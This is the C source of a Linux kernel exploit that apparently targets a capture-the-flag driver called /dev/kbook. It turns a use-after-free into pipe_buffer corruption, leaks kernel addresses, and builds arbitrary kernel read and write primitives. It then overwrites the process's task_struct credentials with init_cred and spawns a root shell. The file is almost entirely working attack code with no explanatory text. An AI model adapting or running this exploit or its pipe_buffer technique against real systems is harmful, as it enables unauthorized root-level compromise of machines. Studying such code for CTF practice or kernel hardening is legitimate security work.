#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <sched.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/socket.h>
#include <sys/prctl.h>

/**
 * I - fundamental functions
 * e.g. CPU-core binder, user-status saver, etc.
 */

size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
size_t init_task, init_nsproxy, init_cred;

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

/* root checker and shell poper */
void get_root_shell(void)
{
    puts("[*] checking for root...");

    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
    
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}


struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_buf_operations {
    int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);
    void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
    int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
    int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};

/**
 * II - interface to interact with challenge
 */

#define MAX_BOOK_NR 0x20
#define MAX_PAGE_BOOK_NR 0x20
#define PAPER_SZ 2048

int bookshelf[MAX_BOOK_NR];

#define CMD_CHOOSE_BOOK 0x114
#define CMD_SET_PAGE    0x514
#define CMD_DELETE_PAGE 0x1919810

long choose_book(int fd, size_t idx)
{
    return ioctl(fd, CMD_CHOOSE_BOOK, idx);
}

long set_page(int fd, size_t idx)
{
    return ioctl(fd, CMD_SET_PAGE, idx);
}

long delete_page(int fd, size_t idx)
{
    return ioctl(fd, CMD_DELETE_PAGE, idx);
}

/**
 *  III - FIRST exploit stage: transfer UAF to pipe_buffer by page reuse
*/

#define ANON_PIPE_OPS 0xffffffff8241ccc8

#define PIPE_SPRAY_NR 480

int book_idx = -1, page_idx = -1;
int pipe_fd[PIPE_SPRAY_NR][2], orig_idx = -1, victim_idx = -1;

struct pipe_buf_operations *pipe_ops;
size_t page_leak;

void prepare_pipe(void)
{
    puts("[*] Prepare pipe...");

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (pipe(pipe_fd[i]) < 0) {
            printf("[x] FAILED to create %d pipe!\n", i);
            err_exit("FAILED to allocate pipe.");
        }
    }

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        write(pipe_fd[i][1], &i, sizeof(i));
        write(pipe_fd[i][1], &i, sizeof(i));
        write(pipe_fd[i][1], &i, sizeof(i));
    }

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (fcntl(pipe_fd[i][0], F_SETPIPE_SZ, 0x1000 * 4) < 0) {
            perror("failed to reset pipe_size");
            err_exit("FAILED to realloc pipe_buffer!");
        }
    }
}

void init_bookshelf(void)
{
    puts("[*] Allocating and writing books...");

    for (int i = 0; i < MAX_BOOK_NR; i++) {
        bookshelf[i] = open("/dev/kbook", O_RDWR);
        if (bookshelf[i] < 0) {
            perror("failed to open /dev/kbook");
            err_exit("FAILED at opening dev node!");
        }

        if (choose_book(bookshelf[i], i) < 0) {
            err_exit("FAILED at binding the book with fd!");
        }

        for (int j = 0; j < MAX_PAGE_BOOK_NR; j++) {
            if (set_page(bookshelf[i], j) < 0) {
                err_exit("FAILED at setting the page for book!");
            }

            if (write(bookshelf[i], "arttnba3", 8) < 0) {
                err_exit("FAILED at writing the book!");
            }
        }
    }

    puts("[*] Releasing book pages...");
    for (int i = 0; i < MAX_BOOK_NR; i++) {
        for (int j = 0; j < MAX_PAGE_BOOK_NR; j++) {
            if (delete_page(bookshelf[i], j) < 0) {
                err_exit("FAILED at releasing the page!");
            }
        }
    }
}

void construct_uaf_on_pipe_buffer(void)
{
    size_t buf[0x1000];
    puts("[*] Realloc pipe_buffer...");

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (fcntl(pipe_fd[i][0], F_SETPIPE_SZ, 0x1000 * 32) < 0) {
            perror("failed to reset pipe_size");
            err_exit("FAILED to realloc pipe_buffer!");
        }
    }

    puts("[*] Checking for UAF...");

    for (int i = 0; i < MAX_BOOK_NR; i++) {
        for (int j = 0; j < MAX_PAGE_BOOK_NR; j++) {
            if (set_page(bookshelf[i], j)) {
                err_exit("FAILED at setting the page for book!");
            }

            if (read(bookshelf[i], buf, 0x100) < 0) {
                err_exit("FAILED at reading the book!");
            }

            if (buf[0] != *(size_t*) "arttnba3" && buf[2] > 0xffffffff81000000){
                book_idx = i;
                page_idx = j;
                goto out;
            }
        }
    }

out:
    if (book_idx < 0 || page_idx < 0) {
        err_exit("FAILED to transfer UAF to pipe_buffer!");
    }

    page_leak = buf[0];
    pipe_ops = (struct pipe_buf_operations*) buf[2];
    kernel_offset = buf[2] - ANON_PIPE_OPS;
    kernel_base = 0xffffffff81000000 + kernel_offset;

    printf("\033[32m\033[1m[*] Successfully make UAF on pipe_buffer with "
            "book \033[0m%d\033[32m\033[1m, page \033[0m%d\n", 
            book_idx, page_idx);
    printf("[*] Leak page addr: %lx\n", page_leak);
    printf("[*] Leak pipe_buf_ops: %p\n", pipe_ops);
    printf("\033[32m\033[1m[+] Successfully get kernel base: \033[0m%lx, "
           "\033[32m\033[1moffset: \033[0m%lx.\n",
           kernel_base,
           kernel_offset);
}

/**
 *  IV - SECOND exploit stage: overwrite the task_struct to root
*/

void find_uaf_pipe(void)
{
    size_t new_page = page_leak + 0x40;

    puts("[*] Overwriting pipe_buffer and seeking the UAF pipe...");

    write(bookshelf[book_idx], &new_page, sizeof(new_page));

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        int nr;

        read(pipe_fd[i][0], &nr, sizeof(nr));
        if (nr != i) {
            orig_idx = nr;
            victim_idx = i;
            break;
        }
    }

    puts("[*] Checking for UAF pipe...");
    if (orig_idx < 0 || victim_idx < 0) {
        err_exit("FAILED to construct UAF on pipe!");
    }

    puts("[+] Successfully made UAF on pipe_buffer!");
    printf("[+] Original: %d, victim: %d\n", orig_idx, victim_idx);
}

void arbitrary_read_by_pipe(size_t page_addr, void *buf)
{
    struct pipe_buffer *fake_buf;
    size_t data[0x1000];

    read(bookshelf[book_idx], data, sizeof(*fake_buf));
    fake_buf = (struct pipe_buffer*) data;

    fake_buf->page = (struct page*) page_addr;
    fake_buf->len = 0x1ff8;
    fake_buf->offset = 0;
    fake_buf->ops = pipe_ops;

    write(bookshelf[book_idx], data, sizeof(*fake_buf));

    read(pipe_fd[victim_idx][0], buf, 0xfff);
}

void arbitrary_write_by_pipe(size_t page_addr, void *buf, size_t len)
{
    struct pipe_buffer *fake_buf;
    size_t data[0x1000];

    read(bookshelf[book_idx], data, sizeof(*fake_buf));
    fake_buf = (struct pipe_buffer*) data;

    fake_buf->page = (struct page*) page_addr;
    fake_buf->len = 0;
    fake_buf->offset = 0;
    fake_buf->ops = pipe_ops;

    write(bookshelf[book_idx], data, sizeof(*fake_buf));

    write(pipe_fd[victim_idx][1], buf, len > 0xffe ? 0xffe : len);
}

void seeking_vmemmap_base(void)
{
    size_t seek_page, buf[0x1000];

    printf("[*] Start reading back from %lx...\n", page_leak);
    for (seek_page = page_leak; ; seek_page -= 0x40) {
        arbitrary_read_by_pipe(seek_page, buf);
        if (buf[0] == (kernel_base + 0x60)) {
            vmemmap_base = seek_page - (0x9d000 / 0x1000) * 0x40;
            break;
        }
    }

    if (vmemmap_base == 0xffffea0000000000) {
        err_exit("ARE YOU KIDDING ME?");
    }

    printf("\033[32m\033[1m[+] Get vmemmap_base: \033[0m%lx\n", vmemmap_base);
}

#define INIT_CRED 0xffffffff82c4e3b8

size_t current_pcb_page;
size_t data_buf[0x1000];

void privilege_escalation_by_task_overwrite(void)
{
    size_t  *comm_addr;

    puts("[*] Seeking task_struct in memory...");

    prctl(PR_SET_NAME, "arttnba3pwnn");

    for (int i = 0; 1; i++) {
        arbitrary_read_by_pipe(vmemmap_base + i * 0x40, data_buf);
    
        comm_addr = memmem(data_buf, 0xf00, "arttnba3pwnn", 12);
        if (comm_addr && (comm_addr[-2] > 0xffff888000000000) /* task->cred */
            && (comm_addr[-3] > 0xffff888000000000)) {  /* task->real_cred */
            current_pcb_page = vmemmap_base + i * 0x40;
            printf("\033[32m\033[1m[+] Found task_struct on page: \033[0m%lx\n",
                   current_pcb_page);
            break;
        }
    }

    puts("[*] Starting privilege escalation by overwriting task_struct...");
    comm_addr[-2] = INIT_CRED + kernel_offset;
    comm_addr[-3] = INIT_CRED + kernel_offset;
    arbitrary_write_by_pipe(current_pcb_page, data_buf, 0x1000);
}

int main(int argc, char **argv, char **envp)
{
    bind_core(0);

    /* stage-I */
    prepare_pipe();
    init_bookshelf();
    construct_uaf_on_pipe_buffer();

    /* stage-II */
    find_uaf_pipe();
    seeking_vmemmap_base();
    privilege_escalation_by_task_overwrite();

    get_root_shell();

    return 0;
}
